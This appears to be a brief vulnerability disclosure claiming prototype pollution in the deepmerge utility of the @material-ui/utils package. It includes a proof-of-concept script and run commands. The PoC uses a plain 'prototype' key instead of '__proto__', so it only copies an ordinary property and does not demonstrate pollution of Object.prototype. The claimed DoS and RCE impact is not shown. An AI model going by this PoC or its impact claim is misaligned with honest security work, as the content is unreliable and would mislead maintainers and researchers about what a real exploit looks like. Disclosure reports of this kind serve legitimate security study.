# Description
material-ui package is vulnerable to prototype pollution issue 
file can be found in  https://github.com/mui-org/material-ui/blob/next/packages/material-ui-utils/src/deepmerge.ts
# Proof of Concept 
1. Creating poc file namely poc.js
```js
var utils = require('@material-ui/utils');
var src = {};
let object = utils.deepmerge({}, JSON.parse('{ "myProperty": "a", "prototype" : { "isAdmin" : true } }'), {
    clone: false,
});
console.log(object.prototype.isAdmin);
```
2. Execute command in terminal  npm install @material-ui/utils
3. Execute command in terminal  node poc.js
[POC] https://drive.google.com/file/d/1twz_btDed0aeQVEO8BBAVs4Vg8kWjcxV/view?usp=sharing
# Impact
Prototype pollution which could lead to DOS and RCE


